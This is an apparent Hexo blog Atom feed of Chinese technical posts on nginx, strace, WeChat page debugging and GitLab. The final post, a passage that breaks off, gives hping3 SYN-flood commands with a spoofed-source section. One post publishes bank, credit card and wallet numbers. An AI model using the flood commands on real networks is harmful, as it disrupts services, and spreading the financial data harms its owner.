proxy_pass http_server;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;nginx使用stream分流&quot;&gt;&lt;a href=&quot;#nginx使用stream分流&quot; class=&quot;headerlink&quot; title=&quot;nginx使用stream分流&quot;&gt;&lt;/a&gt;nginx使用stream分流&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;nginx用443端</summary>
      
    
    
    
    
    <category term="技术" scheme="https://blog.jumhorn.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>跟踪系统调用进行调试</title>
    <link href="https://blog.jumhorn.com/strace_debug/"/>
    <id>https://blog.jumhorn.com/strace_debug/</id>
    <published>2023-10-05T19:47:42.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h1><pre><code>跟踪调试，查看进程系统调用</code></pre><h2 id="查看系统打开文件例子"><a href="#查看系统打开文件例子" class="headerlink" title="查看系统打开文件例子"></a>查看系统打开文件例子</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pidof find the pid of running process</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">跟踪文件</span></span><br><span class="line">sudo strace -e trace=file -p `pidof fcgiwrap`</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">跟踪系统调用</span></span><br><span class="line">sudo strace -e stat -p `pidof sshd`</span><br></pre></td></tr></table></figure><h1 id="实战应用"><a href="#实战应用" class="headerlink" title="实战应用"></a>实战应用</h1><pre><code>在部署nginx和phpmyadmin的时候出现报错FastCGI sent in stderr: Primary script unknown这个报错没有给出实质性的信息，但是又没有办法调试php-fpm这时查看系统调用就是神奇的方法</code></pre><h2 id="处理方法"><a href="#处理方法" class="headerlink" title="处理方法"></a>处理方法</h2><ol><li><p>配置php-fpm</p><p> 让该进程只有一个worker，便于跟踪调查</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># edit /etc/php-fpm.conf or /etc/php-fpm.d/www.conf</span><br><span class="line"># add this line to specify only one worker</span><br><span class="line">pm.max_children = 1</span><br><span class="line">pm.start_servers = 1</span><br><span class="line">pm.min_spare_servers = 1</span><br><span class="line">pm.max_spare_servers = 1</span><br></pre></td></tr></table></figure><ol start="2"><li><p>查看php-fpm进程ID</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -aef | grep php</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@iZuf6fy7vf35cte6gb1cmmZ ~]<span class="comment"># ps -aef | grep php</span></span><br><span class="line">root      2083     1  0 21:00 ?        00:00:00 php-fpm: master process (/etc/php-fpm.conf)</span><br><span class="line">apache    2087  2083  0 21:00 ?        00:00:00 php-fpm: pool www</span><br></pre></td></tr></table></figure></li><li><p>跟踪php-fpm工作进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -p  `pidof php-fpm worker(2087 in the last example)`</span><br></pre></td></tr></table></figure><p>查看命令执行结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@iZuf6fy7vf35cte6gb1cmmZ ~]<span class="comment"># sudo strace -p 2087</span></span><br><span class="line">strace: Process 2087 attached</span><br><span class="line">accept(0, &#123;sa_family=AF_INET, sin_port=htons(34364), sin_addr=inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>)&#125;, [16]) = 3</span><br><span class="line"><span class="built_in">times</span>(&#123;tms_utime=0, tms_stime=0, tms_cutime=0, tms_cstime=0&#125;) = 429556550</span><br><span class="line">poll([&#123;fd=3, events=POLLIN&#125;], 1, 5000)  = 1 ([&#123;fd=3, revents=POLLIN&#125;])</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\1\1\0\1\0\10\0\0&quot;</span>, 8)         = 8</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\0\1\0\0\0\0\0\0&quot;</span>, 8)          = 8</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\1\4\0\1\5\27\1\0&quot;</span>, 8)         = 8</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\17\37SCRIPT_FILENAME/usr/share/phpM&quot;</span>..., 1304) = 1304</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\1\4\0\1\0\0\0\0&quot;</span>, 8)          = 8</span><br><span class="line">lstat(<span class="string">&quot;/usr/share/phpMyadmin/index.php&quot;</span>, 0x7ffd9a94f1f0) = -1 ENOENT (No such file or directory)</span><br><span class="line"><span class="built_in">stat</span>(<span class="string">&quot;/usr/share/phpMyadmin&quot;</span>, 0x7ffd9a9516a0) = -1 ENOENT (No such file or directory)</span><br><span class="line"><span class="built_in">stat</span>(<span class="string">&quot;/usr/share&quot;</span>, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</span><br><span class="line"><span class="built_in">stat</span>(<span class="string">&quot;/usr&quot;</span>, &#123;st_mode=S_IFDIR|0755, st_size=4096, ...&#125;) = 0</span><br><span class="line"><span class="built_in">stat</span>(<span class="string">&quot;&quot;</span>, 0x7ffd9a9516a0)                = -1 ENOENT (No such file or directory)</span><br><span class="line">setitimer(ITIMER_PROF, &#123;it_interval=&#123;0, 0&#125;, it_value=&#123;60, 0&#125;&#125;, NULL) = 0</span><br><span class="line">rt_sigaction(SIGPROF, &#123;0x55d4dc25e470, [PROF], SA_RESTORER|SA_RESTART, 0x7f1e735593b0&#125;, &#123;SIG_DFL, [], 0&#125;, 8) = 0</span><br><span class="line">rt_sigprocmask(SIG_UNBLOCK, [PROF], NULL, 8) = 0</span><br><span class="line"><span class="built_in">times</span>(&#123;tms_utime=0, tms_stime=0, tms_cutime=0, tms_cstime=0&#125;) = 429556551</span><br><span class="line">setitimer(ITIMER_PROF, &#123;it_interval=&#123;0, 0&#125;, it_value=&#123;0, 0&#125;&#125;, NULL) = 0</span><br><span class="line">write(3, <span class="string">&quot;\1\7\0\1\0\27\1\0Primary script unknown\n\0&quot;</span>..., 152) = 152</span><br><span class="line">shutdown(3, SHUT_WR)                    = 0</span><br><span class="line">recvfrom(3, <span class="string">&quot;\1\5\0\1\0\0\0\0&quot;</span>, 8, 0, NULL, NULL) = 8</span><br></pre></td></tr></table></figure><p> 从输出结果中可以看出no such file or directory,实际去查找该文件时，发现是nginx中我的文件名大小写错误</p></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><pre><code>系统中错误排查时，要有此经验才能很好的排查问题相似命令pstack，gdb等</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;strace&quot;&gt;&lt;a href=&quot;#strace&quot; class=&quot;headerlink&quot; title=&quot;strace&quot;&gt;&lt;/a&gt;strace&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;跟踪调试，查看进程系统调用
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;查看系统打开文件例子</summary>
      
    
    
    
    
    <category term="技术" scheme="https://blog.jumhorn.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>用chrome调试微信内置网页浏览器</title>
    <link href="https://blog.jumhorn.com/chrome_wechat_debug/"/>
    <id>https://blog.jumhorn.com/chrome_wechat_debug/</id>
    <published>2023-09-15T21:08:42.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用chrome调试微信网页"><a href="#用chrome调试微信网页" class="headerlink" title="用chrome调试微信网页"></a>用chrome调试微信网页</h1><pre><code>今天想修改微信内置网页的一些参数，实现JavaScript注入，跳过一些限时的功能，就查找了一下如何调试微信内置页面</code></pre><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ol><li>chrome</li><li>安卓手机(含微信)</li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li>微信端</li></ol><ul><li><p>安卓手机开启开发者模式，允许 USB debug</p><p>  实际操作成功后，usb连接电脑，会有usb图标</p></li><li><p>微信内置页面开启允许调试</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://debugxweb.qq.com/?inspector=true</span><br></pre></td></tr></table></figure><pre><code>打开页面显示下载微信即为成功</code></pre><ol start="2"><li>chrome端</li></ol><ul><li>chrome浏览器打开<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome://inspect/#devices</span><br></pre></td></tr></table></figure></li></ul><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><pre><code>电脑上出现微信正在访问的页面，点击inspect即可。此时可以在电脑上注入JavaScript代码，修改页面功能。</code></pre><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><ol><li><p>无法显示网页，出现黑屏</p><p> 该方法要求一定要能访问google页面，需要科学上网</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;用chrome调试微信网页&quot;&gt;&lt;a href=&quot;#用chrome调试微信网页&quot; class=&quot;headerlink&quot; title=&quot;用chrome调试微信网页&quot;&gt;&lt;/a&gt;用chrome调试微信网页&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;今天想修改微信内置网页的一些参数，实</summary>
      
    
    
    
    
    <category term="技术" scheme="https://blog.jumhorn.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://blog.jumhorn.com/hello-world/"/>
    <id>https://blog.jumhorn.com/hello-world/</id>
    <published>2023-09-15T21:08:42.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
    <category term="信息" scheme="https://blog.jumhorn.com/tags/%E4%BF%A1%E6%81%AF/"/>
    
  </entry>
  
  <entry>
    <title>nginx_redirect</title>
    <link href="https://blog.jumhorn.com/nginx-redirect/"/>
    <id>https://blog.jumhorn.com/nginx-redirect/</id>
    <published>2023-05-23T22:38:23.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nginx跳转带来的问题"><a href="#nginx跳转带来的问题" class="headerlink" title="nginx跳转带来的问题"></a>nginx跳转带来的问题</h1><pre><code>记录一次实战配置中nginx自动跳转带来的问题，以及该问题的发现与分析</code></pre><h2 id="nginx配置如下"><a href="#nginx配置如下" class="headerlink" title="nginx配置如下"></a>nginx配置如下</h2><pre><code>nginx作为流量分发，对于443端口同时支持ssh和https服务web服务是配置的/vscode访问后端服务</code></pre><ol><li><p>stream配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># SNI 分流</span><br><span class="line">stream &#123;</span><br><span class="line">map $ssl_preread_server_name $name &#123;</span><br><span class="line">ssh.jumhorn.com     127.0.0.1:22;</span><br><span class="line">default         127.0.0.1:8880;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">listen      443;</span><br><span class="line">proxy_pass  $name;</span><br><span class="line">ssl_preread on; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>http模块内部server配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       127.0.0.1:8880 ssl;</span><br><span class="line">    server_name  jumhorn.com www.jumhorn.com;</span><br><span class="line"></span><br><span class="line">    location /vscode/ &#123;</span><br><span class="line">        proxy_pass  http://127.0.0.1:8080/;</span><br><span class="line"></span><br><span class="line">        proxy_redirect http://127.0.0.1:8080/ https://$host/vscode/;</span><br><span class="line"></span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_read_timeout 300;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Real-PORT $remote_port;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><pre><code>使用该配置当访问https://jumhorn.com/vscode时，服务器会自动跳转到https://jumhorn.com:8880/vscode,因为这个错误的8880端口，导致服务不可访问</code></pre><h2 id="查找错误"><a href="#查找错误" class="headerlink" title="查找错误"></a>查找错误</h2><pre><code>打开浏览器F12调试时发现浏览器依次访问https://jumhorn.com/vscode然后302跳转(注意response中Location字段)https://jumhorn.com:8880/vscode这个跳转是如何来的？</code></pre><h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><pre><code>这里分析了老半天才发现由于配置中没有 location /vscode，所以当访问https://jumhorn.com/vscode时，nginx自动跳转加上了内部配置的端口号,即便添修改成如下配置自动跳转到/vscode/，nginx依然会加上内部端口号，导致访问出错所以只能将全部域名添加上改成 return 302 http://$host/vscode/;之前问题分析都十分正确，解决方法不算优雅，但是解决了问题，当时虽然有困扰，但是不敢耽误时间。过了大半年后，这个问题有了更为优雅的解决方法，只需要加上port_in_redirect off;即可调试的时候也要非常小心，因为浏览器有缓存，会导致加上之后没有实际效果，所以要清空缓存再试</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       127.0.0.1:8880 ssl;</span><br><span class="line">    server_name  jumhorn.com www.jumhorn.com;</span><br><span class="line">    port_in_redirect off;</span><br><span class="line"></span><br><span class="line">    location /vscode/ &#123;</span><br><span class="line">        proxy_pass  http://127.0.0.1:8080/;</span><br><span class="line"></span><br><span class="line">        proxy_redirect http://127.0.0.1:8080/ https://$host/vscode/;</span><br><span class="line"></span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_read_timeout 300;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Real-PORT $remote_port;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="完整配置"><a href="#完整配置" class="headerlink" title="完整配置"></a>完整配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">http&#123;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       127.0.0.1:8880 ssl;</span><br><span class="line">        server_name  jumhorn.com www.jumhorn.com;</span><br><span class="line"></span><br><span class="line">        location /vscode &#123;</span><br><span class="line">            return 302 https://$host/vscode/;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /vscode/ &#123;</span><br><span class="line">            proxy_pass  http://127.0.0.1:8080/;</span><br><span class="line"></span><br><span class="line">            proxy_redirect http://127.0.0.1:8080/ https://$host/vscode/;</span><br><span class="line"></span><br><span class="line">            proxy_http_version 1.1;</span><br><span class="line">            proxy_read_timeout 300;</span><br><span class="line">            proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">            proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">            proxy_set_header Host $host;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header X-Real-PORT $remote_port;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stream &#123;</span><br><span class="line">map $ssl_preread_server_name $name &#123;</span><br><span class="line">ssh.jumhorn.com     127.0.0.1:22;</span><br><span class="line">default         127.0.0.1:8880;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">listen      443;</span><br><span class="line">proxy_pass  $name;</span><br><span class="line">ssl_preread on; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><ol><li><p>port_in_redirect off;添加之后没有效果</p><p> 调试的时候也要非常小心，因为浏览器有缓存，会导致加上之后没有实际效果，所以要清空缓存再试</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;nginx跳转带来的问题&quot;&gt;&lt;a href=&quot;#nginx跳转带来的问题&quot; class=&quot;headerlink&quot; title=&quot;nginx跳转带来的问题&quot;&gt;&lt;/a&gt;nginx跳转带来的问题&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;记录一次实战配置中nginx自动跳转带来的问</summary>
      
    
    
    
    
    <category term="技术" scheme="https://blog.jumhorn.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>gitlab创建远程开发环境，将gitlab作为前端</title>
    <link href="https://blog.jumhorn.com/gitlab-remote-development/"/>
    <id>https://blog.jumhorn.com/gitlab-remote-development/</id>
    <published>2023-04-30T13:51:28.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GitLab-Remote-Development"><a href="#GitLab-Remote-Development" class="headerlink" title="GitLab Remote Development"></a>GitLab Remote Development</h1><pre><code>github,gitlab都支持webide,但是使用webide时无法使用shell命令,恰好由于gitlab支持远程开发，所以将vps算力提供给gitlab，是的webide可以编译，调试</code></pre><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><blockquote><p><a href="https://docs.gitlab.com/ee/user/project/remote_development/">https://docs.gitlab.com/ee/user/project/remote_development/</a></p></blockquote><pre><code>gitlab直接使用docker部署</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ol><li>申请域名证书</li><li>开启docker镜像</li><li>获取token<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec my-environment cat TOKEN</span><br></pre></td></tr></table></figure></li></ol><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ol><li>打开任意webide</li><li>连接 domain.com:3443</li></ol><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><pre><code>目前没有给出源码，只给出了docker部署</code></pre><ol><li><p>exited (134)</p><p> 在centos上跑ubuntu docker，node报错ulimit,要更新版本，我使用的是aliyun的centos就没再折腾了</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;GitLab-Remote-Development&quot;&gt;&lt;a href=&quot;#GitLab-Remote-Development&quot; class=&quot;headerlink&quot; title=&quot;GitLab Remote Development&quot;&gt;&lt;/a&gt;GitLab Remo</summary>
      
    
    
    
    
    <category term="技术" scheme="https://blog.jumhorn.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>about</title>
    <link href="https://blog.jumhorn.com/about/"/>
    <id>https://blog.jumhorn.com/about/</id>
    <published>2023-04-21T14:35:46.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>展示常用信息</title>
    <link href="https://blog.jumhorn.com/index/"/>
    <id>https://blog.jumhorn.com/index/</id>
    <published>2023-03-22T22:21:37.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><ul><li><p><a href="https://jumhorn.com:8880/bash">bash</a></p></li><li><p><a href="https://jumhorn.com:8880/vscode">vscode</a></p></li></ul><h1 id="导航页面"><a href="#导航页面" class="headerlink" title="导航页面"></a>导航页面</h1><ul><li><p><a href="https://jumhorn.com:8880/android.html">Android程序服务端</a></p></li><li><p><a href="https://jumhorn.com:8880/upload.html">文件上传</a></p></li><li><p><a href="https://jumhorn.com:8880/video.html">视频测试</a></p></li><li><p><a href="https://jumhorn.com:8880/vipvideo.html">会员视频</a></p></li></ul><h1 id="信息展示"><a href="#信息展示" class="headerlink" title="信息展示"></a>信息展示</h1><h2 id="银行卡号"><a href="#银行卡号" class="headerlink" title="银行卡号"></a>银行卡号</h2><pre><code>6228480661366304813621226410000556188562148325095327896666668249914314</code></pre><h2 id="信用卡号"><a href="#信用卡号" class="headerlink" title="信用卡号"></a>信用卡号</h2><pre><code>5329599178190488</code></pre><h2 id="美国银行"><a href="#美国银行" class="headerlink" title="美国银行"></a>美国银行</h2><ol><li><p>帐户1</p><p> 20000043670051<br> 028000024</p></li><li><p>帐户2</p><p> 20000012485963<br> 028000024</p></li></ol><h2 id="手机号"><a href="#手机号" class="headerlink" title="手机号"></a>手机号</h2><pre><code>14703386881</code></pre><h2 id="微信ID"><a href="#微信ID" class="headerlink" title="微信ID"></a>微信ID</h2><pre><code>wxid_lfvumigsxwgz22</code></pre><h2 id="USDT-TRC20"><a href="#USDT-TRC20" class="headerlink" title="USDT(TRC20)"></a>USDT(TRC20)</h2><pre><code>TLRyqMj1Z5yrzY7SkXk3jbPLG3Lb5mdQK8</code></pre><h2 id="USDT-BEP20"><a href="#USDT-BEP20" class="headerlink" title="USDT(BEP20)"></a>USDT(BEP20)</h2><pre><code>0x7e6f4f0e7dd6fe4619e005ea5299652e3f72b892</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常用工具&quot;&gt;&lt;a href=&quot;#常用工具&quot; class=&quot;headerlink&quot; title=&quot;常用工具&quot;&gt;&lt;/a&gt;常用工具&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://jumhorn.com:8880/bash&quot;&gt;bash&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="信息" scheme="https://blog.jumhorn.com/tags/%E4%BF%A1%E6%81%AF/"/>
    
  </entry>
  
  <entry>
    <title>一条命令实现DDOS</title>
    <link href="https://blog.jumhorn.com/DDOS/"/>
    <id>https://blog.jumhorn.com/DDOS/</id>
    <published>2022-02-15T00:00:00.000Z</published>
    <updated>2024-08-01T23:10:09.014Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一条命令实现DDOS攻击"><a href="#一条命令实现DDOS攻击" class="headerlink" title="一条命令实现DDOS攻击"></a>一条命令实现DDOS攻击</h1><pre><code>这个工具可太强了，一会就把路由器发崩溃了，局域网的电脑也连不上了</code></pre><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><ol><li>hping3</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">debian</span></span><br><span class="line">apt install hping3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mac</span></span><br><span class="line">brew install hping</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">centos</span></span><br><span class="line">brew install hping3</span><br></pre></td></tr></table></figure><h1 id="SYN-DDOS攻击"><a href="#SYN-DDOS攻击" class="headerlink" title="SYN DDOS攻击"></a>SYN DDOS攻击</h1><pre><code>工具使用方法</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-S specifies sending SYN packets</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-p 80 targets port 80</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-i u20 waits 20 microseconds between packets = 50,000</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">packets per second</span></span><br><span class="line">sudo hping3 -i u20 -S -p 80 -c 50000 ip(x.x.x.x)</span><br></pre></td></tr></table></figure><h1 id="隐藏自身IP地址"><a href="#隐藏自身IP地址" class="headerlink" title="隐藏自身IP地址"></a>隐藏自身IP地址</h1><pre><code>模拟出多个IP攻击主机的情况其实SYN攻击，只需要发送SYN包，返回的包根本不处理所以SYN包的source_address可以随机填写</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--rand-source    random <span class="built_in">source</span> address mode</span></span><br><span class="line"><span 